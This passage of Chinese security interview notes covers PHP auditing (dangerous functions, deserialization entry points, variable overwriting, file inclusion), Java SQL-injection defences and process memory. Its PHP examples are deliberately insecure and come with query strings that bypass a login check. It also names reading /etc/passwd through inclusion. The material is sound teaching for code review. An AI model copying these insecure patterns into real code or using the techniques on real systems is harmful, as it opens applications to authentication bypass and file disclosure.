<p>这些函数可以直接执行系统命令或 PHP 代码，是最高危的一类函数</p>
<ul>
<li><strong><code>eval()</code></strong>: 将字符串作为 PHP 代码执行</li>
<li><strong><code>assert()</code></strong>: 检查一个字符串是否为合法的 PHP 代码，如果是则执行</li>
<li><strong><code>shell_exec()</code></strong>: 通过 shell 执行命令并返回所有输出</li>
<li><strong><code>exec()</code></strong>: 执行一个外部程序</li>
<li><strong><code>system()</code></strong>: 执行外部程序并显示输出</li>
<li><strong><code>passthru()</code></strong>: 执行外部程序并直接将原始输出传递给浏览器</li>
<li><strong><code>proc_open()</code></strong>: 执行一个命令，并打开指向其标准输入&#x2F;输出&#x2F;错误的文件指针</li>
<li><strong><code>popen()</code></strong>: 打开一个指向进程的管道。</li>
</ul>
<p><strong>2. 文件包含 &#x2F; 读取 &#x2F; 写入</strong></p>
<p>这些函数如果参数可控，可能导致任意文件读取、写入，甚至是远程代码执行（RCE）</p>
<ul>
<li><strong><code>include()</code> &#x2F; <code>include_once()</code></strong>: 包含并执行指定文件</li>
<li><strong><code>require()</code> &#x2F; <code>require_once()</code></strong>: 包含并执行指定文件，若失败则抛出致命错误</li>
<li><strong><code>file_get_contents()</code></strong>: 将整个文件读入一个字符串</li>
<li><strong><code>file_put_contents()</code></strong>: 将一个字符串写入文件</li>
<li><strong><code>fopen()</code> &#x2F; <code>fread()</code> &#x2F; <code>fwrite()</code></strong>: 用于打开、读取和写入文件</li>
<li><strong><code>unlink()</code></strong>: 删除文件</li>
<li><strong><code>move_uploaded_file()</code></strong>: 将上传的文件移动到新位置</li>
<li><strong><code>readfile()</code></strong>: 读取文件并写入到输出缓冲</li>
</ul>
<p><strong>3. 数据处理与反序列化</strong></p>
<p>这些函数在处理用户输入时如果不加限制，可能导致反序列化漏洞</p>
<ul>
<li><strong><code>unserialize()</code></strong>: 将字符串反序列化为 PHP 值</li>
<li><strong><code>json_decode()</code></strong>: 将 JSON 字符串解码为 PHP 变量</li>
<li><strong><code>gzuncompress()</code> &#x2F; <code>gzinflate()</code></strong>: 解压压缩字符串，可能引发内存溢出或拒绝服务。</li>
</ul>
<p><strong>4. 变量操作与反射</strong></p>
<ul>
<li><strong><code>extract()</code></strong>: 从数组中导入变量到当前符号表。如果数组内容可控，可能覆盖现有变量</li>
<li><strong><code>parse_str()</code></strong>: 将字符串解析成变量，同样可能导致变量覆盖</li>
<li><strong><code>create_function()</code></strong>: 创建一个匿名函数。在 PHP 7.2.0 之后已被废弃，但旧版本中可能存在代码执行风险</li>
</ul>
<p><strong>5. 数据库操作</strong></p>
<p>尽管大多数现代框架都有自己的 ORM 和查询构造器，但仍需注意原生数据库函数的使用，尤其是拼接 SQL 语句时</p>
<ul>
<li><strong><code>mysql_query()</code></strong>: 执行 SQL 查询（已废弃）</li>
<li><strong><code>mysqli_query()</code></strong>: 执行 SQL 查询</li>
<li><strong><code>PDO::query()</code></strong>: 执行 SQL 查询</li>
</ul>
<p><strong>6. 其他</strong></p>
<ul>
<li><strong><code>header()</code></strong>: 用于设置 HTTP 头信息。如果参数可控，可能导致 CRLF 注入或重定向漏洞</li>
<li><strong><code>die()</code> &#x2F; <code>exit()</code></strong>: 终止脚本执行。在某些情况下，可能导致逻辑漏洞</li>
</ul>
<hr>
<h3 id="反序列化时有哪些魔术方法是可以作为一个入手点去找的"><a href="#反序列化时有哪些魔术方法是可以作为一个入手点去找的" class="headerlink" title="反序列化时有哪些魔术方法是可以作为一个入手点去找的"></a>反序列化时有哪些魔术方法是可以作为一个入手点去找的</h3><p><strong><code>__wakeup()</code></strong></p>
<p>当<code>unserialize()</code>函数被调用时，<code>__wakeup()</code> 方法会立即被调用。这个方法通常用于在对象被反序列化后重新建立其内部状态。</p>
<ul>
<li><strong>攻击思路：</strong> 攻击者可以寻找 <code>__wakeup()</code> 方法中是否存在<strong>危险函数调用</strong>（例如 <code>system()</code>、<code>eval()</code> 等），或者其内部逻辑是否可控，从而导致一些意想不到的后果</li>
</ul>
<p><strong><code>__destruct()</code></strong></p>
<p>当一个对象被销毁时（例如脚本执行结束或对象被显式释放），<code>__destruct()</code> 方法会被调用</p>
<ul>
<li><strong>攻击思路：</strong> <code>__destruct()</code> 是攻击者最喜欢的入手点之一，因为它<strong>总是在脚本执行的最后被调用</strong>，无论反序列化过程是否成功。如果该方法中存在文件删除、命令执行或其他敏感操作，攻击者可以通过构造恶意序列化字符串来触发它，从而达到攻击目的</li>
</ul>
<p><strong><code>__toString()</code></strong></p>
<p>当一个对象被当作字符串使用时，<code>__toString()</code>方法会被自动调用</p>
<ul>
<li><strong>攻击思路：</strong> 攻击者可以寻找哪些函数会将对象作为字符串处理。例如，<code>echo</code>、<code>print</code>、<code>file_get_contents()</code>等函数都会触发 <code>__toString()</code>。如果该方法中包含敏感操作，或者可以将 <code>__toString()</code> 的返回值作为参数传递给其他危险函数，就可能导致漏洞。这通常被称为“<strong>POP链</strong>”中的一个重要环节</li>
</ul>
<p><strong><code>__call()</code></strong></p>
<p>当一个对象中不存在某个方法，但你却试图调用它时，<code>__call()</code> 方法会被自动调用</p>
<ul>
<li><strong>攻击思路：</strong> <code>__call()</code>可以用来触发其他方法。如果 <code>__call()</code> 方法能够通过某种方式调用到危险方法，攻击者就可以通过调用一个不存在的方法来间接触发漏洞</li>
</ul>
<p><strong><code>__callStatic()</code></strong></p>
<p>与 <code>__call()</code> 类似，但它在调用一个不存在的静态方法时触发</p>
<ul>
<li><strong>攻击思路：</strong> 同样可以用于触发类中的敏感静态方法</li>
</ul>
<p><strong><code>__get()</code> 和 <code>__set()</code></strong></p>
<p>当试图访问一个不存在的或不可访问的属性时，<code>__get()</code> 会被调用。当试图给一个不存在的或不可访问的属性赋值时，<code>__set()</code> 会被调用</p>
<ul>
<li><strong>攻击思路：</strong> 这两个方法经常用于创建所谓的“<strong>属性链</strong>”。通过控制 <code>__get()</code> 或 <code>__set()</code> 中的逻辑，可以间接控制其他对象的属性或触发其他方法。例如，<code>__get()</code> 返回的对象又可以触发其自身的魔术方法，形成一个连锁反应</li>
</ul>
<hr>
<h3 id="常见的路由方法"><a href="#常见的路由方法" class="headerlink" title="常见的路由方法"></a>常见的路由方法</h3><p><strong>1. 静态路由</strong></p>
<p>这是最简单、最直接的路由方式。你为每个固定的URL定义一个唯一的处理程序</p>
<ul>
<li><strong>示例：</strong><ul>
<li><code>/about</code> -&gt; <code>AboutController::index()</code></li>
<li><code>/contact</code> -&gt; <code>ContactController::show()</code></li>
</ul>
</li>
</ul>
<p>这种方法的优点是<strong>清晰直观、性能高</strong>，因为框架不需要进行复杂的模式匹配。缺点是<strong>灵活性差</strong>，无法处理动态变化的URL，比如文章 ID 或用户 ID</p>
<p><strong>2. 动态路由</strong></p>
<p>动态路由允许你在 URL 中定义可变参数。这通常通过在路由规则中使用占位符来实现</p>
<ul>
<li><strong>示例：</strong><ul>
<li><code>/posts/&#123;id&#125;</code> -&gt; <code>PostController::show($id)</code></li>
<li><code>/users/&#123;name&#125;</code> -&gt; <code>UserController::profile($name)</code></li>
</ul>
</li>
</ul>
<p>这种方法<strong>非常灵活</strong>，能很好地处理像博客文章、用户资料页等需要动态内容的场景。现代框架通常还支持为这些占位符添加正则表达式约束，以确保参数格式正确</p>
<p><strong>3. 命名路由</strong></p>
<p>命名路由为每个路由规则分配一个唯一的名称。这个名称可以在应用中用来生成URL，而不是直接硬编码URL字符串</p>
<ul>
<li><strong>示例：</strong><ul>
<li>定义：<code>Route::get(&#39;/profile/&#123;id&#125;&#39;, &#39;UserController@show&#39;)-&gt;name(&#39;user.profile&#39;);</code></li>
<li>使用：<code>redirect(route(&#39;user.profile&#39;, [&#39;id&#39; =&gt; 1]));</code></li>
</ul>
</li>
</ul>
<p><strong>命名路由是最佳实践</strong>。它的主要优点是<strong>可维护性高</strong>。如果将来 URL 结构发生变化，你只需要修改路由定义文件，而不需要在整个代码库中查找和替换所有硬编码的 URL</p>
<p><strong>4. 路由群组</strong></p>
<p>路由群组允许你将一组具有共同属性（如前缀、中间件或命名空间）的路由组合在一起</p>
<ul>
<li><strong>示例：</strong><ul>
<li><code>Route::prefix(&#39;admin&#39;)-&gt;group(function () &#123;</code></li>
<li><code>Route::get(&#39;/dashboard&#39;, &#39;AdminController@dashboard&#39;);</code></li>
<li><code>Route::get(&#39;/users&#39;, &#39;AdminController@users&#39;);</code></li>
<li><code>&#125;);</code></li>
</ul>
</li>
</ul>
<p>上述代码会将 <code>/admin/dashboard</code> 和 <code>/admin/users</code> 这两个路由组合在一起。路由群组的主要好处是<strong>减少代码重复</strong>，让路由定义更加简洁和有条理</p>
<hr>
<h3 id="介绍下-PHP-的变量覆盖"><a href="#介绍下-PHP-的变量覆盖" class="headerlink" title="介绍下 PHP 的变量覆盖"></a>介绍下 PHP 的变量覆盖</h3><p>有几个 PHP 函数在不安全地使用时，极易引发变量覆盖漏洞</p>
<p><strong>1. <code>extract()</code></strong></p>
<p><code>extract()</code>函数从一个数组中导入变量到当前的符号表。它会<strong>根据数组的键名创建同名的变量</strong>，并将键值赋给这些新变量</p>
<ul>
<li><p><strong>漏洞示例：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 $_GET 中导入变量，但没有做任何过滤</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;mypassword&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Login successful as admin!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Login failed.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，攻击者可以通过URL <code>?username=admin&amp;password=mypassword</code> 来覆盖 <code>$username</code> 和 <code>$password</code> 这两个变量，从而绕过身份验证</p>
</li>
<li><p><strong>安全建议：</strong> 使用 <code>extract()</code> 时，务必指定第二个参数 <code>$flags</code> 为 <code>EXTR_SKIP</code> 或 <code>EXTR_PREFIX_ALL</code>，以防止覆盖现有变量。例如：<code>extract($_GET, EXTR_SKIP);</code></p>
</li>
</ul>
<p><strong>2. <code>parse_str()</code></strong></p>
<p><code>parse_str()</code>函数用于解析URL参数字符串，并将其作为变量导入到当前作用域</p>
<ul>
<li><p><strong>漏洞示例：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将请求的参数字符串解析为变量</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hello admin!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击者可以通过 <code>?username=admin</code> 来覆盖 <code>$username</code> 变量</p>
</li>
<li><p><strong>安全建议：</strong> 始终将 <code>parse_str()</code> 的第二个参数设置为一个数组变量，这样解析的结果会存入该数组，而不是直接创建全局变量。例如：<code>parse_str($_SERVER[&#39;QUERY_STRING&#39;], $query_data);</code></p>
</li>
</ul>
<p><strong>3. <code>import_request_variables()</code></strong></p>
<p>这个函数在PHP 5.4.0 版本后被移除。它的功能是把 <code>$_GET</code>、<code>$_POST</code> 或 <code>$_COOKIE</code> 中的变量导入到全局作用域。由于其固有的安全风险，<strong>不应再使用</strong></p>
<p><strong>4. <code>$$</code> （双重美元符）</strong></p>
<p>双重美元符是一种特殊的变量语法，它会将一个变量的值作为另一个变量的名称</p>
<ul>
<li><p><strong>漏洞示例：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;default&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment">// 动态地创建变量名</span></span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello, &quot;</span> . <span class="variable">$name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果URL为 <code>?name=hacker</code>，<code>$key</code> 的值为 <code>name</code>，<code>$value</code> 的值为 <code>hacker</code>。那么 <code>$$key</code> 实际上就是 <code>$name</code>，它的值被设置为 <code>hacker</code>。攻击者可以通过这种方式覆盖 <code>$name</code> 变量</p>
</li>
<li><p><strong>安全建议：</strong> 避免在没有严格过滤的情况下使用双重美元符来动态创建变量</p>
</li>
</ul>
<hr>
<h3 id="远程文件包含和本地文件包含这两种涉及的-PHP-设置有什么"><a href="#远程文件包含和本地文件包含这两种涉及的-PHP-设置有什么" class="headerlink" title="远程文件包含和本地文件包含这两种涉及的 PHP 设置有什么"></a>远程文件包含和本地文件包含这两种涉及的 PHP 设置有什么</h3><p><strong>1. 本地文件包含（LFI）</strong></p>
<p>本地文件包含漏洞是指攻击者能够包含服务器本地文件系统上的任意文件。这种漏洞的利用通常不依赖于特定的 <code>php.ini</code> 设置，而是完全取决于<strong>代码本身的不安全实现</strong></p>
<p><strong>关键的 PHP 设置：</strong></p>
<ul>
<li><strong><code>allow_url_include</code></strong>：这个设置<strong>通常与 LFI 无关</strong>。它只控制是否允许包含远程文件。即使 <code>allow_url_include</code> 为 <code>Off</code>，LFI 漏洞仍然可以存在</li>
<li><strong><code>open_basedir</code></strong>：这是一个重要的安全设置，它可以<strong>限制 PHP 脚本能够访问的文件目录</strong>。如果配置得当，它可以有效缓解LFI的危害。例如，将 <code>open_basedir</code> 设置为 <code>/var/www/html/</code>，那么PHP脚本就无法包含该目录之外的文件，例如 <code>/etc/passwd</code></li>
</ul>
<p><strong>总结</strong>：对于 LFI，PHP 配置本身提供的防御措施相对有限。<code>open_basedir</code> 是最有用的一个，但<strong>代码层面的白名单验证和输入过滤</strong>才是最根本的防御手段</p>
<p><strong>2. 远程文件包含（RFI）</strong></p>
<p>远程文件包含漏洞是指攻击者能够包含<strong>来自外部服务器</strong>的任意文件。这种漏洞的利用<strong>直接依赖于 PHP 的特定配置</strong>。</p>
<p><strong>关键的 PHP 设置：</strong></p>
<ul>
<li><strong><code>allow_url_include</code></strong>：这是<strong>RFI 漏洞的核心开关</strong><ul>
<li><strong><code>allow_url_include = On</code></strong>：允许通过 URL（如 <code>http://</code> 或 <code>ftp://</code>）来包含远程文件。这是导致 RFI漏洞的直接原因</li>
<li><strong><code>allow_url_include = Off</code></strong>：<strong>禁止</strong>通过 URL 来包含远程文件。<strong>这是默认和推荐的安全设置</strong>。只要这个设置是 <code>Off</code>，即使代码本身存在缺陷，也无法触发远程文件包含攻击</li>
</ul>
</li>
<li><strong><code>allow_url_fopen</code></strong>：这个设置<strong>间接影响</strong> RFI。它控制是否允许 URL 作为文件来处理，比如在 <code>file_get_contents()</code> 或 <code>fopen()</code> 函数中。虽然它本身不直接影响 <code>include</code>，但在某些攻击场景中，如果攻击者需要远程获取文件内容再进行处理，这个设置就会起到作用。然而，<strong><code>allow_url_include</code> 才是决定性的</strong></li>
</ul>
<p><strong>总结</strong>：<code>allow_url_include</code> 的值是判断一个 PHP 应用是否存在RFI漏洞风险的最关键因素。在生产环境中，<strong>始终建议将其设置为 <code>Off</code></strong></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>本地文件包含（LFI）</th>
<th>远程文件包含（RFI）</th>
</tr>
</thead>
<tbody><tr>
<td>漏洞类型</td>
<td>包含服务器本地文件</td>
<td>包含外部服务器文件</td>
</tr>
<tr>
<td>核心函数</td>
<td>include($filename)</td>
<td>include($url)</td>
</tr>
<tr>
<td>关键PHP设置</td>
<td>open_basedir（缓解）</td>
<td>allow_url_include（决定性）</td>
</tr>
<tr>
<td>防御重点</td>
<td>代码层面的白名单和输入过滤</td>
<td>php.ini 中将 allow_url_include 设为 Off</td>
</tr>
<tr>
<td>风险</td>
<td>读取敏感文件，配合其他漏洞可能导致RCE</td>
<td>直接导致RCE</td>
</tr>
</tbody></table>
<h1 id="22-Java-代码审计系列"><a href="#22-Java-代码审计系列" class="headerlink" title="22- Java 代码审计系列"></a>22- Java 代码审计系列</h1><h3 id="JAVA-在做-SQL-注入防御时有哪些方法"><a href="#JAVA-在做-SQL-注入防御时有哪些方法" class="headerlink" title="JAVA 在做 SQL 注入防御时有哪些方法"></a>JAVA 在做 SQL 注入防御时有哪些方法</h3><p><strong>1. 使用预处理语句</strong></p>
<p>这是 Java 中防御 SQL 注入最主要、最安全的方法。它与数据库通信时，会先发送 SQL 语句的模板，数据库编译好后，再将用户数据作为参数发送。这样，数据库只将数据视为数据，不会当作可执行的 SQL 命令</p>
<p><strong>JDBC 示例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDAO</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUserData</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/testdb&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">             <span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(sql)) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 1. 设置参数，将用户输入绑定到占位符</span></span><br><span class="line">            pstmt.setString(<span class="number">1</span>, username);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 执行查询</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstmt.executeQuery()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;User found: &quot;</span> + rs.getString(<span class="string">&quot;username&quot;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;User not found.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>核心:</strong> 使用 <code>?</code> 作为占位符，然后通过 <code>pstmt.setString()</code>、<code>pstmt.setInt()</code> 等方法将用户输入绑定到这些占位符上</li>
</ul>
<p><strong>2. 使用 ORM 框架</strong></p>
<p>如果你使用 Java 生态系统中的主流框架，如 Spring Boot、Hibernate、MyBatis，那么 ORM 是首选。这些框架将面向对象编程与关系型数据库操作结合起来，从根本上消除了手动编写 SQL 的需要，从而自动防御 SQL 注入</p>
<p><strong>Hibernate 示例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.hibernate.Session;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.SessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.query.Query;</span><br><span class="line"><span class="keyword">import</span> com.example.model.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRepository</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SessionFactory sessionFactory;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">findByUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> sessionFactory.openSession()) &#123;</span><br><span class="line">            <span class="comment">// HQL (Hibernate Query Language) 示例</span></span><br><span class="line">            <span class="comment">// Hibernate 会自动处理参数绑定</span></span><br><span class="line">            Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from User where username = :username&quot;</span>, User.class);</span><br><span class="line">            query.setParameter(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> query.uniqueResult();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>核心:</strong> Hibernate 等 ORM 框架在底层使用预处理语句来执行所有数据库操作，因此你不需要担心 SQL 注入问题</li>
</ul>
<p><strong>3. 最小权限原则</strong></p>
<p>这是一个重要的安全实践</p>
<ul>
<li><strong>不要使用数据库的管理员账户</strong>（如 <code>root</code>）来运行应用程序</li>
<li>为你的应用程序<strong>创建专用的数据库用户</strong>，并只授予其完成任务所需的最小权限。例如，一个只进行读取操作的服务，其数据库用户就应该只有 <code>SELECT</code> 权限</li>
</ul>
<table>
<thead>
<tr>
<th>防御方法</th>
<th>优点</th>
<th>缺点</th>
<th>推荐度</th>
</tr>
</thead>
<tbody><tr>
<td>预处理语句</td>
<td>最安全、最彻底的防御；将数据与SQL代码分离。</td>
<td>需要手动编写SQL，语法略显繁琐。</td>
<td>最高</td>
</tr>
<tr>
<td>ORM框架</td>
<td>从根本上杜绝SQL注入；开发效率高；代码可读性好。</td>
<td>需要学习框架；不适用于简单或无框架项目。</td>
<td>非常高</td>
</tr>
<tr>
<td>最小权限</td>
<td>降低攻击后的危害。</td>
<td>无法从根本上防御注入。</td>
<td>非常高（作为安全原则）</td>
</tr>
</tbody></table>
<h1 id="23-操作系统"><a href="#23-操作系统" class="headerlink" title="23- 操作系统"></a>23- 操作系统</h1><h3 id="进程和线程内存空间的关系"><a href="#进程和线程内存空间的关系" class="headerlink" title="进程和线程内存空间的关系"></a>进程和线程内存空间的关系</h3><p><strong>进程的内存空间</strong></p>
<p>一个<strong>进程</strong>可以看作是一个正在运行的程序实例。操作系统为每个进程分配独立的、私有的内存空间，这通常被称为<strong>虚拟地址空间</strong>。这个独立的地址空间主要包括以下几个关键区域：</p>
<ul>
<li><strong>代码段</strong>：存放可执行文件的机器指令（也就是程序的代码）。这部分通常是只读的，以防止程序在运行时修改自身代码</li>
<li><strong>数据段</strong>：存放已初始化的全局变量和静态变量</li>
<li><strong>BSS 段</strong>：存放未初始化的全局变量和静态变量</li>
<li><strong>堆</strong>：用于动态内存分配。程序在运行时，可以随时从堆中申请和释放内存</li>
<li><strong>栈</strong>：用于存放局部变量、函数参数和返回地址。栈是自动管理的，遵循先进后出（LIFO）的原则</li>
</ul>
<p><strong>关键点</strong>：每个进程都有自己独立的虚拟地址空间。这意味着，一个进程无法直接访问另一个进程的内存，除非使用进程间通信（IPC）机制。这种隔离性是操作系统的核心安全机制，可以防止一个进程的错误影响到其他进程，从而保证系统的稳定性</p>
<p><strong>线程的内存空间</strong></p>
<p>一个<strong>线程</strong>是进程内的一个执行单元，有时也被称为“轻量级进程”。与进程不同的是，<strong>同一个进程内的所有线程共享该进程的内存空间</strong></p>
<p>具体来说，这些线程共享：</p>
<ul>
<li><strong>代码段</strong>：所有线程执行的是同一份程序代码</li>
<li><strong>数据段</strong>：所有线程都可以访问和修改同一个进程的全局变量和静态变量</li>
<li><strong>堆</strong>：所有线程都可以从同一个堆中申请和释放动态内存</li>
</ul>
<p>但是，每个线程都有自己<strong>独立的</strong>私有部分：</p>
<ul>
<li><strong>栈</strong>：每个线程都有自己的私有栈，用于存放它自己的局部变量和函数调用信息。这是为了确保每个线程在执行函数时，不会影响到其他线程的执行上下文</li>
<li><strong>寄存器</strong>：每个线程都有自己的寄存器集合，用来保存其执行状态</li>
</ul>
<p>可以把<strong>进程</strong>想象成一个<strong>拥有独立房子的住户</strong>，这个房子里有独立的厨房、客厅和卧室（代表私有的内存空间）。而<strong>线程</strong>则可以想象成<strong>房子里的不同家庭成员</strong></p>
<ul>
<li><strong>进程</strong>：拥有独立的房子（<strong>独立的地址空间</strong>）</li>
<li><strong>线程</strong>：是房子里的家庭成员。他们共享房子里的公共区域，比如<strong>客厅（堆）</strong>、<strong>厨房（数据段）</strong>，但每个人有自己的<strong>卧室（栈）和衣柜（寄存器）</strong></li>
</ul>
<hr>
<h3 id="介绍下父子进程"><a href="#介绍下父子进程" class="headerlink" title="介绍下父子进程"></a>介绍下父子进程</h3><p><strong>父子进程的创建</strong></p>
<p>父子进程的关系是通过一个特殊的系统调用——<strong><code>fork()</code></strong> 来创建的</p>
<ol>
<li>当一个进程（我们称之为<strong>父进程</strong>）调用 <code>fork()</code> 时，操作系统会复制父进程的几乎所有信息，包括代码、数据、堆、栈等，来创建一个新的进程，也就是<strong>子进程</strong></li>
<li><code>fork()</code> 系统调用有一个关键的特点：在父进程中，它会返回新创建的子进程的 <strong>PID（进程ID）</strong>；而在子进程中，它会返回 <strong>0</strong>。这使得程序可以根据返回值来判断自己是父进程还是子进程，并执行不同的代码路径</li>
</ol>
<p><strong>父子进程的资源关系</strong></p>
<p>尽管子进程是父进程的副本，但在资源管理上，它们之间存在一些重要的区别：</p>
<ul>
<li><strong>独立的内存空间</strong>：在创建时，子进程会获得一个与父进程几乎相同的独立内存副本。这意味着，父进程和子进程对各自内存的修改不会互相影响。这遵循了 <strong>写时复制（Copy-on-Write, CoW）</strong> 的机制，即最初它们共享相同的内存页，只有当任一进程试图修改该内存页时，才会真正创建一个新的副本</li>
<li><strong>独立的 PID</strong>：每个进程都有一个唯一的 PID，子进程会获得一个新的、独立的 PID</li>
<li><strong>共享资源</strong>：父子进程会共享一些只读资源，例如程序代码段。此外，它们还会共享打开的文件描述符。这意味着，如果在 <code>fork()</code> 前父进程打开了一个文件，那么子进程也会继承这个文件描述符，可以继续读写这个文件</li>
</ul>
<p><strong>父子进程的生命周期</strong></p>
<ul>
<li><strong>正常终止</strong>：如果父进程或子进程正常执行完毕，它们会退出。当子进程终止时，它会变成一个<strong>僵尸进程（Zombie Process）</strong>，直到它的父进程通过 <code>wait()</code> 或 <code>waitpid()</code> 系统调用来“收尸”，获取它的退出状态，然后这个僵尸进程才会被操作系统彻底清理</li>
